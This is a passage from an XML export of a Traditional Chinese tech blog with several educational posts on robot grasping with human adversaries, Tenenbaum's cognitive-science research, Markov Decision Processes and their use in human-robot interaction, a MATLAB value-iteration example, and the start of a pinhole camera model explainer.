這篇論文透過一個簡單的實驗場景，透過讓一些測試者參與實驗，證明人類的干擾可以讓機器人學習得更好，就讓我們繼續看下去。
過去相關研究機器人用 Deep Reinforcement Learning 學習抓東西是這幾年才比較火熱的研究領域，之前有一些研究 - Supersizing Self-supervision: Learning to Grasp from 50K Tries and 700 Robot Hours
是用很長的時間，讓機器人大量學習，做到可以抓取東西的能力。
但這種方法非常曠日廢時，所以有一些後續的研究 - Supervision via Competition: Robot Adversaries for Learning Tasks 就開始探討如果讓機器人 A 去嘗試干擾機器人 B 的學習過程，是不是可以讓機器人 B 學習得更好。結果還真的可以。
所以這篇論文就再進一步探究，如果對於抓取都沒什麼概念的機器人 A 去干擾都可以幫助機器人 B 學習得更好，那用擁有許多物理知識的人類取代機器人 A 來干擾，是不是能夠更有效率？
雖然乍看之下覺得干擾這件事有點奇怪，但如果再好好思考一下，就會覺得有道理，因為在現實生活中，人類本來也就不一定一直是協助機器人的角色，有時候可能也會不小心影響到機器人的工作。而且如果這些干擾會讓機器人要做的工作失敗，剛好就可以是最佳的教材，因為機器人就知道原本他那樣做可能不夠 robust，就會再調整自己的策略。
方法介紹問題描述
這篇論文把他們的問題表示成一個 two-player game，其中一個玩家是機器人，另一個玩家是人類，一開始整個遊戲的狀態是 $S$，機器人做了一個 action $a^R$ 後，會讓遊戲狀態變成 $S^+$，然後人類會再做一個 action $a^H$，讓遊戲狀態變成 $ S^{++} $。
然後把 reward 設定成

就可以將問題變成，機器人要想辦法學習到能最大化 reward 的策略：

學習演算法這篇論文的核心演算法就在下面的 pseudo code 中：

主要概念都是，讓機器人先做一個 action，然後再觀察人類做完干擾的 action 之後會讓 reward 變成怎麼樣，進而學習到能讓人類干擾最小化的演算法。
如何判斷要抓哪邊他們使用一個簡單的 end-to-end convolutional neural network 來判斷：

一開始，機器人會用 camera 得到一張影像，然後從這張影像中 sample $N_g$ 張比較小的影像輸入上圖的 network，然後對於每張比較小的影像，會再產生出 $N_A$ 個角度的抓取分數，然後機器人就可以從 $N_g \times N_A$ 個可能的抓取位置和角度中選出最高分的。
測試環境測試的環境是在 Mujoco，不過他們有自己修改一下環境，讓 Mujoco 可以接受人類的 input。
他們使用了 5 種不同的物體，讓機器人先抓取後，人類受試者可以提供六個方向的力(上、下、左、右、前、後)來嘗試讓機器人抓到的物體掉落，透過這個簡單的 task 來驗證機器人能否在有人類干擾的情況下學習得更好。
實驗結果論文裡面有提供詳細的測試結果和受試者的問卷調查結果，有興趣的讀者可以自己去閱讀，不過從下面的圖片，應該可以很明顯地看出這篇論文提出來的學習方法是成功的：
第一排的圖片是呈現機器人在人類干擾前，自己學到的抓取位置(紅色的 bar 是指機器人的夾爪張開時的位置，黃色點是夾爪關起來時的位置)。第二排則是在人類干擾後學習到的抓取位置。

總結今天跟大家分享了 Human Robot Interaction 領域中的一個有趣方向，隨著這些研究的持續進展，希望未來有一天機器人能夠大幅度地幫助人類生活！
延伸閱讀
Robot Learning via Human Adversarial Games 的測試環境 code

]]></content>
      <tags>
        <tag>Deep Learning</tag>
        <tag>Human-Robot Interaction</tag>
        <tag>Computer Vision</tag>
        <tag>Grasping</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來看 Joshua B. Tenenbaum 教授有趣的認知科學研究 - Building Machines that Learn and Think Like People</title>
    <url>/2018/09/29/intro-to-josh-tenenbaum-research/</url>
    <content><![CDATA[前言Joshua B. Tenenbaum 教授的研究很有趣，他從小嬰兒的行為出發，研究人們是如何透過無數次跟世界的互動，建立起簡單的物理概念（e.g. 物質不滅、物質不會浮在半空中、物體會撞到彼此等等）、還有簡單的心理學（e.g. 看到別人去抓門把，就可以猜到那個人想要開門）。
今天就想要來介紹一下他的研究和未來的藍圖，讓有興趣鑽研人工智慧的讀者一起看看認知科學跟人工智慧的最前端研究。
我們是從什麼基礎開始建構起一切的能力?這個問題，就是 Tenenbaum 教授研究中最核心的問題。
讓我們看看下面這部影片，在這部影片中，我們可以看到一個 18 個月大的小嬰兒，就已經有能力了解 “書會被櫃子們擋住，得把櫃子打開才能把書放進去”、”別人一直拿書去撞櫃子，是因為他想把書放進去，而且他沒有手開門” 等等稍具複雜度的物理概念和心理學概念。

在我們還無法自己生存、還無法說話、還無法做我們長大後能做的很多事之前，我們就已經學會基本的物理和基本的心理學概念。
這件事情提供的想法是，我們如果可以打造出有能力自己學懂這些基礎物理知識和心理學知識的機器，那這部機器是否就能夠再學會各式各樣的技能？就如同有能力學會基礎物理和心理學知識的小嬰兒，就有能力學會長大後需要學的各種技能。
腦海中的遊戲引擎雖然嬰兒的學習過程提供了我們一些 insight，讓研究有了切入方向，但有能力學習的基礎到底是什麼？
以 Tenenbaum 教授的想法來說，大概就是一個 能夠自我修正的、programmable 的遊戲引擎。
上面這句話到底在講什麼東西？讓我們繼續往下看。
大家可能都有經驗，當你要找一件東西，你會開始回想起你上次還看見那個東西的場景，回憶你走過的每個地方，直到你不在記得那件東西還在，你就可以回到那個地方尋找。
小小的一件事情，包含了你的記憶能力、場景想像能力，就好像你的腦海中有一個可讀出檔案的遊戲。
再舉一個例子，當你要拿一個很珍貴的花瓶，你是不是會很小心翼翼地拿？因為你甚至可以在腦海中想像如果沒拿好花瓶，可能會摔到地上破掉？
這跟我們在電腦模擬中看到的現象簡直一模一樣，你可以模擬上千次，但不會直接改變現實世界；就像你可以在腦海中模擬無數次上台演講的畫面。
這個概念很重要，因為在處理訊息跟思考的時候，我們幾乎是時時依賴這個腦海中遊戲引擎。雖然有很多習慣因為已經被重複太多次，在使用時幾乎不需要調用遊戲引擎來模擬，但是這些習慣必然是符合我們腦內遊戲引擎的規則。
什麼意思呢？
就像我們每個人都拿過很多次杯子，所以幾乎是想都不用想就可以拿起來。但如果有一天，有個愛整人的朋友把你的杯子用強力膠黏在桌上，於是你要拿杯子發現它穩如泰山完全不動，你就會感到驚訝。因為在你的腦海中，杯子的重量是有一定程度的，而一般情況下，不可能重到你拿不起來。
所以這時候你就會開始研究，為什麼你看到的現象跟你 腦海中的遊戲引擎 預測得不一樣？直到你發現原來是被黏在桌上，你腦海中的遊戲引擎就會發生變化，讓它未來更有可能預測到杯子會被黏在桌上（似乎也有點強化學習的味道，對吧？）。
這也是為什麼魔術很有趣，因為魔術常常推翻我們遊戲引擎具備的規則；

怎麼打造像人一樣學習的機器 ?Tenenbaum 教授的短期研究藍圖如下圖，他的想法，是從視覺著手：

為什麼是從視覺，我想這也很合理，畢竟在我們還不太會走路、不太會抓東西的時候，我們就已經不斷地在看這世界中的各項事物，開始學習世界裡的一切規則，而這些規則都是我們可以正常走路、抓好東西的重要基礎。
有了藍圖之後，接下來就是方法，於是他們也提出了一個大的架構：

而撐起這個大架構的技術細節，就是我們耳熟能詳的各種技術：

但這些技術如何交互使用？如何構建成具備人類認知能力的基礎？都還是剛起步的研究題目，所以就留待大家去發掘。
總結今天跟大家簡單介紹了 Tenenbaum 教授的研究，個人覺得他的研究出發點非常有趣，也完全可以跟我們的成長經驗串連，希望未來可以看到更多有趣的研究成果。
延伸閱讀
MIT AGI: Building machines that see, learn, and think like people (Josh Tenenbaum)
Building Machines that Learn &amp; Think Like People - Prof. Josh Tenenbaum ICML2018

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>artificial intelligence</tag>
        <tag>cognitive science</tag>
      </tags>
  </entry>
  <entry>
    <title>簡介 Markov Decision Process 與其應用</title>
    <url>/2018/10/27/intro-to-mdp-and-app/</url>
    <content><![CDATA[前言今天想跟大家介紹一個在 Reinforcement Learning 中相當重要的基礎 - Markov Decision Process（MDP）。比起一般的 search，MDP 能夠 model 更複雜的問題，今天就讓我們來介紹 MDP 的基礎觀念，還有他的應用跟限制。
MDP 想要 model 什麼問題？MDP 想要處理的問題是：當你採取的 action 不會完全如你所想的達到你想要的 state，你該如何採取 action？
舉例來說（這例子出自延伸閱讀 1 裡面的 MDP），假設有一隻機器人，在一個迷宮裡面，他從最左下角出發，要走到終點（+1 or -1 都是終點），而且要盡量讓 reward 最大：
(This image comes from UC Berkeley CS188 Lecture 8)
但當這隻機器人想要往上走，他只有 80% 的機率會真的走到上面那一格，另外有 10% 的機率會走到右邊那格、10% 的機率會走到左邊那格。
(This image comes from UC Berkeley CS188 Lecture 8)
這時候就尷尬了，因為當這隻機器人還沒實際開始走，他其實不知道接下來會發生什麼事。他不知道當他要往上走，會不會真正往上。
這種問題，我們稱做 non-deterministic search problem，也就是你無法事先做好所有規劃，因為你採取某個 action，無法 determine 會產生什麼結果。
在這種情況下，機器人就不能只是用一些搜索的演算法，得到 “上上右右右” 這種可以無腦照做的步驟，因為只要其中有一步不如預期，那就到不了葛來分多 +1 分的終點。
在這種情況下，我們希望機器人可以有一套想法，他可以知道在什麼情況下該怎麼做。假設他第一步想往上，卻因為那 10% 的機率向右了。那沒關係，就走 “右上上右” 就是了，反正一樣到得了終點。
機器人的這一套想法，通常被稱做 Policy。比起一個可以直接照做的 plan，policy 比較像是一套規則，告訴機器人在什麼 state 要做什麼事。
延伸一下，我們可能遇到過某些人，或自己也發生過，還不太會變通，講一動才做一動，這就像是 你還在抱怨老闆「幹嘛不一次說清楚」嗎？新鮮人該知道但很少人告訴你的職場五件事 裡面提到的印表機例子。
怎麼用數學來描述 MDP？首先，我們需要定義一些基本的東西，例如有：

總共有哪些狀態（機器人可以在迷宮裡的每一格）
起始狀態是什麼（機器人在最左下角的那一格）
可以採取的行動（往上、往下、往左、往右走）
轉移的機率（例如在某一格 s_k，採取的 action 是往上走，那只有 0.8 的機率會讓 s’ 真的是 s_k 的上方那一格；各自有 0.1 的機率會讓 s’ 落在 s_k 的左邊或右邊）
到達某個狀態獲得的獎賞（例如走到 -1 那格就會被扣一分）

寫成數學符號變成下面這樣：
(This image comes from UC Berkeley CS188 Lecture 8)
另外，考慮到我們想要解的東西，我們還需要定義

reward（下面用 value 來表示）
Q-state（Q(s,a) 表示你已經從 state s 選擇了 a action，但因為 a action 產生的結果是什麼還不確定，所以我們把這個還沒決定的 state 稱作 Q-state）
policy（就是我們希望學到的東西，讓機器人知道在什麼 state 底下該採取什麼 action）

(This image comes from UC Berkeley CS188 Lecture 8)
怎麼解 MDP？定義完上面這些數學符號之後，接下來我們來講解一下該怎麼解。

假設我們在 state s，我們希望可以挑到讓 Q-state value 最大的 action；


而 Q-state value 要最大，就看這個 Q-state 會落到哪些 s’，這些 s’ 所帶來的 value 會最大：

為何式子會長成上面這樣？因為我們用 $$T(s, a, s’)$$ 來表示從 state s，採取 action a，會變成 state s’的機率。這個機率再乘上 s’ 的 reward，還有 s’ 會得到的 value，就是我們預期 Q-state 會帶來的好處。

把 1. 的 $$V^*(s)$$ 用 2. 展開：



最後，把這些步驟合起來，就會得到一個可以慢慢收斂的演算法。

以一開始的迷宮例子來說，我們經過 100 次 iteration，就會知道在每個 state，往哪邊走會得到最大的 value，這些 value 跟 action 方向顯示在下圖：

而這其實就是讓機器人知道他在不同 state 該怎麼選擇 action 的 policy。
MDP 的應用基本上只要是連續決策、而且在決策過程中的行動具有不確定性，就可以用 MDP 來處理。
比如說該要怎麼投資股票、怎麼跟人對話等等，有很多有趣的應用。有興趣的讀者可以參考 這篇文章 - Real Applications of Markov Decision Processes 或 這個答案。
MDP 的限制雖然我們已經學會怎麼用 MDP 來獲得一個 policy，但 MDP 有一些限制是我們需要知道的，才能夠在對的地方正確使用：

無法處理非上帝視角的問題：我們生活的世界中，有很多東西是我們還無法觀測到的（比如人內心的想法、比如宇宙中的暗物質），所以我們無法描述這世界的真實狀態，這種問題就由更進階的 Partially Observable Markov Decision Processes 來嘗試 model。
只考慮到 reward，沒考慮到採取 action 的 cost：我們在採取行動時，除了會考慮獲得的 reward，也會考慮付出的代價，有興趣的讀者可以參考這篇 The naïve utility calculus: Joint inferences about the costs and rewards of actions。

總結今天跟大家介紹了 MDP 的基本觀念跟數學解法，希望大家在學習 Reinforcement Learning 時有更紮實清楚的底子。
延伸閱讀
UC Berkeley CS188 Intro to AI – Course Materials

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Markov Decision Process</tag>
        <tag>Reinforcement Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用 Markov Decision Process 描述 Human-Robot Interaction 問題</title>
    <url>/2018/11/24/intro-to-mdp-on-hri/</url>
    <content><![CDATA[前言上次我們介紹了 Markov Decision Process 的基本概念，雖然上次有簡單提到 MDP 的應用，但並不是很詳細，所以今天我們想嘗試把 MDP 跟 Human-Robot Interaction 問題連結起來，一起來看怎麼從一個簡單的 insight 出發，加上 MDP 的數學基礎，最後形成一篇嚴謹的論文 ( Human-Robot Interactive Planning using Cross-Training: A Human Team Training Approach ) 吧！
這篇論文要講什麼Human-Robot Interaction 是一個探討機器人跟人如何互動的學科，而目前最常討論的議題之一就是，如何讓機器人和人可以更有效率地一起完成工作。這篇論文嘗試讓機器人跟人進行 job rotation，讓彼此都處在對方的處境中，進而讓合作的效率提升。
這篇 paper 是源自於什麼 insight？Insight 1：同一個 team 裡面的成員，處理事情的方法（mental model）越接近，他們越容易理解彼此的需要，進而提升團隊的效率。

Insight 2: 進行 Cross-Training，也就是讓機器人和人輪流交換工作，讓他們都去做對方會做的事，可以讓他們的 mental model 更接近。

這個 insight 怎麼用數學描述？看了上面的 insight，感覺頗符合直覺的，因為我們可以想像自己跟其他人合作，如果可以做做看對方的工作，就更容易體會對方做事情所感受到的需求，在合作時也更容易滿足對方的需求。
但問題是，這樣的直覺怎麼跟數學接起來？
這時候，就要用到我們上週學習的 MDP 了，首先，這篇論文假設，人類的 mental model（或說白話一點，行為的偏好）可以用 MDP 來描述。

MDP 跟欲描述問題的初步關係

若我們仔細看 MDP 裡面的所有變數，真正需要我們煩惱的有兩件事 - reward 要怎麼定義？Transition probabilities 要怎麼定義？
這兩個地方就是這篇論文要動手腳的地方了。首先，作者假設機器人已經有一點 prior knowledge，也就是有第一版的 reward 跟 transition probabilities，於是就可以用 value iteration 的演算法算出第一版機器人的 policy。
這一版 policy 可以想成是機器人原本認為該怎麼完成任務的方法。但可能跟人類夥伴的工作方法不一樣，所以就需要來做 cross training。

怎麼把 cross training 跟 MDP 接起來

接下來就是重點，我們先假設，機器人跟人是一起要鎖螺絲：人負責放螺絲到三個要鎖的位置，機器人負責把螺絲鎖緊。那 Cross training 有兩個階段，首先是 forward phase，也就是機器人跟人都負責自己該做的地方；接著是 rotation phase，也就是機器人跟人互換，這時人要負責鎖螺絲，機器人負責放螺絲。
於是，雖然一開始機器人有第一版 policy，但機器人在 forward phase 可以觀察，從某個 state s，自己做完某個 action 後，人會讓 state 變成怎麼樣的 s’（這邊用 s’ 表示經過機器人和人的 action 後，state s 的下一個 state）。然後就用這樣的狀態變化來更新 MDP 的 transition function。接著，在 rotation phase，這時機器人是要擺放螺絲，所以就可以由人來給予機器人 reward 的 feedback，讓機器人可以更新自己對各 state 的 reward 認知，所以就可以算出新的、較接近人類夥伴的 policy。（大家應該可以看出，即使不同人的 policy 偏好不同，機器人都可以透過這套演算法，去適應自己夥伴的偏好）
這篇論文的限制
首先，人類的 mental model 相當複雜，用 MDP 來 model 有點像是把人類的偏好用 transition probabilities 跟 reward 表示，但這樣比較像是知其然不知其所以然。就像我們如果跟其他人合作，我們可以去猜想、甚至理解為什麼夥伴會有他的偏好。但用 MDP 顯然沒有這樣的描述能力。

如果今天要讓機器人融入人類社會，要做更多的事，這樣的 model 能夠更 general 嗎？目前的做法看起來是，一旦要做的事情變得很多，就得訓練很多套 MDP。


這篇論文的貢獻雖然上面講了一些限制，但這篇論文其實是很讚，110 次的引用數不是掛著好看的。

跳脫用單純 Reinforcement Learning 的方式來學習跟人合作，而是將合作問題巧妙地用 MDP 來表示人類 mental model，然後用 cross training 來改進合作的效率。

用嚴謹的數學方法精準地描述這過程，雖然若仔細看 paper，我們還是會看到不少假設，讓推導可以進行下去，但已經算是相對頗嚴謹的 paper 了。


我這篇介紹沒 cover 到的問題
Transition probabilities 在上周介紹的 MDP 定義中，提到 MDP是用來處理當採取一個 action，因為環境中有一些不確定的因素，讓我們採取完 action 會到達的 state s’ 有多種可能的問題。那這篇論文的意思是要機器人把人類 action 當做一個環境中的變因，然後機器人認知的 transition probabilities 盡量往人類的偏好靠近？（因為從 current state s 開始，機器人採取某個 action，人類也採取某個 action，讓 state 變成 s’）

實作上要怎麼定義 state 有多少？action 又有多少？


總結今天跟大家介紹了一篇論文，來講怎麼使用 MDP 到 HRI 的問題上面，我覺得這個領域很有趣，也很值得投入，希望對想要入門的朋友有幫助。
延伸閱讀
Mathematical Models of Adaptation In Human-Robot Collaboration
Github repository: awesome-human-robot-interaction

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Human-Robot Interaction</tag>
        <tag>Markov Decision Process</tag>
      </tags>
  </entry>
  <entry>
    <title>Markov Decision Process 的程式範例</title>
    <url>/2018/12/22/intro-to-mdp-program/</url>
    <content><![CDATA[前言之前跟大家介紹過 Markov Decision Process（MDP） 的原理跟數學推導 還有 在 Human-Robot Interaction 上的應用，今天我們就帶大家透過一個程式來體驗實作上的細節。有興趣的讀者可以透過這個例子將這個程式應用到機器人上！
快速複習 MDP 的基本概念在進入問題之前，我們先簡單複習一下 MDP，首先是 MDP 的定義：

然後，假設已經知道在每個 state 會獲得多少 reward，我們就可以用 value iteration 的演算法算出在各 state 該採取哪個 action 可以獲得最高的 reward（也就是獲得 optimal policy）：

如果覺得看不太懂也沒關係，可以回去看 Markov Decision Process（MDP） 的原理跟數學推導。
程式場景說明今天我們要討論的程式，是假設我們要實作如下場景：
今天你有一隻機器人要幫你清理桌子，桌上有一個寶特瓶（bottle）跟一個玻璃杯（glass），機器人應該要把寶特瓶跟玻璃杯都拿起來，但你還不太確定這隻機器人能不能順利地完成清理的任務。
隨著你對這隻機器人的觀察，你可能會越來越相信或越來越不信他會把事情做好，而當你不信這隻機器人的時候，你就會想要出手干涉他的行為。
跟 MDP 的符號相接首先，我們要先知道我們必須定義清楚 state、action、transition matrix 跟 reward。因為這是所有 MDP 問題必備的元素。
再來，因為我們現在的問題牽涉到人類相不相信機器人，所以 state 會從單純只有 world state（bottle、glass 的狀態）延伸到還有 human state。而且，action 也有分 human 跟 robot 的 action。
我們把 state 跟 action 定義清楚：

人類的 state 可以分成相信或不相信


世界中的 state 可以根據 bottle 和 glass 在桌上、機器人手上、人手上來區分（兩種物體都各有三種可能，所以共有 3*3&#x3D;9 種 state）
 


然後，我們把 transition 定義清楚：

當機器人選擇去拿 bottle 或 glass，人類出手干預的機率
 從下表中可以看出，若人相信機器人，當機器人要拿 bottle 時，人干預的機率是 0.1；若人相信機器人，當機器人要拿 glass 時，人干預的機率是 0.2；依此類推。
 
 這張圖中有點小錯誤，第一列的最右欄應該是 $P(a^H_t&#x3D;Intervene|s^H_t, a^R_t)$。

當人已經出手干預（或不干預），world state 會怎麼變化
 

人的 state 會怎麼變化
 


有了以上的這些機率之後，我們就可以計算 transition matrix。
最後，我們需要定義 reward：

審視一下現在的 model，還缺一些推導看到這邊，大家應該會覺得不太懂，怎麼感覺起來跟之前學到的 MDP 不太一樣？之前我們學到的是我們只有一個機器人會採取 action，但因為 action 會帶來的結果是 non-deterministic，所以我們才需要 MDP 來 model。
但按照我們上面的定義，我們會畫出一個這樣的 graph：


human state（$s^H_t$）跟 robot action（$a^R_t$） 會決定 human action（$a^H_t$）
$s^H_t$、$a^R_t$ 跟 $a^H_t$ 會決定下一時刻 t+1 的 human state
…依此類推

這跟我們原本認知的 MDP：

長得不大一樣。
開始推導成 MDP巧妙的地方來了，我們可以將 state space 用 human state 跟 world state 一起定義
$$ S &#x3D; S^H * S^W$$
所以這張圖裡面的 human state space 和 world state space 就可以合併（紅的合在一起、藍的合在一起）：

然後，我們可以把 $a^H_t$ 視為 MDP 裡面的不確定因素。因為機器人無法掌握人的行為，所以機器人不知道自己今天若去抓 bottle，到底能不能到達 “成功抓起 bottle” 的 state，而這就是符合原本 MDP 精神的地方。
雖然接下來還有一些數學上的推導，不過個人覺得有點太過細節，有興趣的讀者可以去看看 這個 note 的 page.5-6，對於機率的 marginalization 無感的話可以看我之前寫的 Why do we need marginalization in probability? (為什麼我們在機率中需要討論邊緣化)。
程式碼整段 code 主要的順序還是

定義 state
定義一些基本的轉換機率（為了計算　transition matrix）
計算 transition matrix
定義 reward
用 value iteration 算出 optimal policy

然後就上 code 啦：
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% CSCI 699: Computational Human-Robot Interaction %%%%%%%%%% Fall 2018, University of Southern California    %%%%%%%%%% Author: Stefanos Nikolaidis, nikolaid@usc.edu   %%%%%%%%%% Commented by: Po-Jen Lai, pojenlai@usc.edu      %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% clear allclose all ## 定義 state human_states_str = &#123;&#x27;no_trust&#x27;, &#x27;trust&#x27;&#125;; Label.BOTTLE = 1;Label.GLASS = 2; Label.ON_TABLE = 1;Label.PICKED_BY_ROBOT = 2;Label.PICKED_BY_HUMAN = 3; Label.NO_TRUST = 1;Label.TRUST = 2; objstate_str = &#123;&#x27;on_table&#x27;,&#x27;picked_robot&#x27;,&#x27;picked_human&#x27;&#125;;ractions_str = &#123;&#x27;pick_bottle&#x27;,&#x27;pick_glass&#x27;&#125;; ## 定義一些基本的轉換機率（為了計算　transition matrix） %&#123;no_trust,trust&#125; x&#123;bottle, glass&#125;PROB_TRUST_INCREASE = [0.8 0.9;    0.0 0.0]; %&#123;no_trust,trust&#125; x &#123;bottle,glass&#125;PROB_TRUST_INTERVENE = [0.3 0.8;    0.1 0.2]; counter = 1;for ii = 1:3 %for each object    for jj = 1:3 %for each  state        world_states(counter,:) = [ii,jj];        counter = counter + 1;    endendnum_human_states = length(human_states_str);num_world_states = counter -1;num_trust_states = 2;num_states = num_world_states*num_trust_states;num_ractions = length(ractions_str); ## 計算 transition matrix Trans = zeros(num_states,num_ractions,num_states); for sh = 1:num_human_states    for sw = 1:num_world_states        for ra = 1:num_ractions            world_state = world_states(sw,:);            ss = (sh-1)*num_world_states + sw;                        %picked by robot            new_world_state = world_state;            new_world_state(ra) =Label.PICKED_BY_ROBOT;            nsw = findWorldState(new_world_state,world_states);                        nsh = sh; %trust stays the same            nss = (nsh-1)*num_world_states + nsw;            Trans(ss,ra,nss) = (1-PROB_TRUST_INTERVENE(sh,ra))*(1-PROB_TRUST_INCREASE(sh,ra));                        if sh == 1 %trust can increase only if low                nsh = sh+1;                nss = (nsh-1)*num_world_states + nsw;                Trans(ss,ra,nss) = (1-PROB_TRUST_INTERVENE(sh,ra))*PROB_TRUST_INCREASE(sh,ra);            end                        %picked by human            new_world_state = world_state;            new_world_state(ra) =Label.PICKED_BY_HUMAN;            nsw = findWorldState(new_world_state,world_states);                        nsh = sh; %trust stays the same            nss = (nsh-1)*num_world_states + nsw;            Trans(ss,ra,nss) = PROB_TRUST_INTERVENE(sh,ra);        end    endend disp(&#x27; &#x27;)disp(&#x27;Transition Matrix&#x27;)for ss = 1:num_states    for ra = 1:num_ractions        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        nIndices = find(Trans(ss,ra,:)&gt;0);        %do not worry about invalid actions        if (world_states(sw,ra) == Label.ON_TABLE)            str = strcat(&#x27;if~&#x27;, human_states_str&#123;sh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(sw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(sw,2)) , &#x27; and robot does~&#x27; , ractions_str&#123;ra&#125;,&#x27;:&#x27;);            disp(str);            for nn = 1:length(nIndices)                nss = nIndices(nn);                                nsh = floor(nss/(num_world_states+1)) + 1;                nsw = nss - (nsh-1)*num_world_states;                str = strcat(&#x27;then the prob of ~&#x27;, human_states_str&#123;nsh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(nsw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(nsw,2)),&#x27;:&#x27;,num2str(Trans(ss,ra,nss)));                disp(str);            end        end    endend ## 定義 reward %reward functionRew = zeros(num_states,num_ractions);for ss = 1:num_states    for ra = 1:num_ractions        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;                  %say bonus if starts with glass         if (world_states(sw,Label.GLASS)==Label.PICKED_BY_ROBOT)&amp;&amp; (world_states(sw,Label.BOTTLE)==Label.ON_TABLE)           Rew(ss,ra) = 5;         end                  %if we are not in a final state        if (world_states(sw,1)==Label.ON_TABLE) || (world_states(sw,2)==Label.ON_TABLE)            if world_states(sw,ra)~= Label.ON_TABLE %penalize infeasible actions                Rew(ss,ra) = -1000;            end        end    endend %add positive reward for goal.goal = findWorldState([Label.PICKED_BY_ROBOT, Label.PICKED_BY_ROBOT],world_states);for ra = 1:num_ractions    for sh = 1:2        ss = (sh-1)*num_world_states + goal;        Rew(ss,ra) = 10;    endend %print reward functiondisp(&#x27; &#x27;)disp(&#x27;reward function&#x27;)for ss = 1:num_states    for ra = 1:num_ractions        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        str = strcat(&#x27;if~&#x27;, human_states_str&#123;sh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(sw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(sw,2)) , &#x27;and robot action is~&#x27;,ractions_str&#123;ra&#125;, &#x27; then reward is: &#x27;,num2str(Rew(ss,ra)));        disp(str);    endend ## 用 value iteration 算出 optimal policy %value iterationT = 3;V = zeros(num_states,1);policy = zeros(num_states,T);new_V = zeros(num_states,1);Q = zeros(num_states, num_ractions);for tt = T:-1:1    for ss = 1:num_states                 %check if terminal state        if ss == 12            debug = 1;        end        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        if ((world_states(sw,1)~=Label.ON_TABLE) &amp;&amp; (world_states(sw,2)~=Label.ON_TABLE))            new_V(ss) = Rew(ss,1);            policy(ss,tt) = 1;            continue;        end                          maxV = -1e6;        maxIndx = -1;        for ra = 1:num_ractions            res = Rew(ss,ra);            for nss = 1:num_states                res = res +  Trans(ss,ra,nss)*V(nss);            end            Q(ss,ra) = res;            if res &gt; maxV                maxV = res;                maxIndx = ra;            end        end        new_V(ss) = maxV;        policy(ss,tt) = maxIndx;    end    V = new_V;end disp(&#x27; &#x27;)disp(&#x27;policy&#x27;)%print policyfor tt = 1    tt    for ss = 1:num_states        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        if ((world_states(sw,1) == Label.ON_TABLE)||(world_states(sw,2) == Label.ON_TABLE)) %we care only about feasible states            str = strcat(&#x27;if~&#x27;, human_states_str&#123;sh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(sw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(sw,2)) , &#x27;then robot does: &#x27;,ractions_str&#123;policy(ss,tt)&#125;);            disp(str);        end    endend

總結今天跟大家簡單介紹了一下該怎麼寫 MDP 的程式，雖然沒有細到每一行程式碼都解釋清楚，但對於想要自己弄懂並應用的讀者來說應該已經有些幫助，若有問題歡迎你在下方留言討論！
延伸閱讀
Computational Human-Robot Interaction
awesome-human-robot-interaction

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Human-Robot Interaction</tag>
        <tag>Markov Decision Process</tag>
      </tags>
  </entry>
  <entry>
    <title>清晰說明針孔相機的內部參數與外部參數矩陣</title>
    <url>/2018/04/22/intro-to-pinhole-camera-model/</url>
    <content><![CDATA[前言學習電腦視覺的同學們應該都有學習過相機的內部參數和外部參數矩陣，網路上也有很多說明文章，不過在學習過程中，還是花了一些時間把一些似懂非懂的觀念釐清，所以今天想要來寫一篇文章幫大家整理最簡單的基本概念，讓學習變得更容易。
內部參數和外部參數矩陣最基本的應用就是從 2D 影像去重建 3D 世界的樣貌，也就是可以從畫面中的點去推得 3D 世界中的座標，接下來就讓我們一起來看看基本的原理。
成像的原理最基本的相機模型，就是針孔相機。他的成像原理就是，物體反射出來的光線，透過針孔，會在針孔的感光平面上成像，如下圖所示：

大家有時候看到內部參數的示意圖，會是如下圖：

其實只是把 virtual image plane 跟 image plane 視作相同的概念，只要知道這一點，就比較不會被混淆。
內部參數矩陣了解上面的概念之後，我們就可以利用 virtual image plane 的表示法，來幫助我們推得某一點（X, Y, Z）在 virtual image plane 上面的座標（u, v）該是多少。
首先，我們考慮最簡單的關係，
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} f &amp; 0 &amp; 0 \ 0 &amp; f &amp; 0 \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
但是，我們的相機會因為有組裝誤差等等，不會非常理想，principal axis 不一定會落在 virtual image plane 的中心，可能會在 u 方向跟 v 方向各自有一個平移量，若這兩個平移量分別為 $t_u$ 跟 $t_v$，我們就可以將剛剛的矩陣寫成
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} f &amp; 0 &amp; t_u \ 0 &amp; f &amp; t_v \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
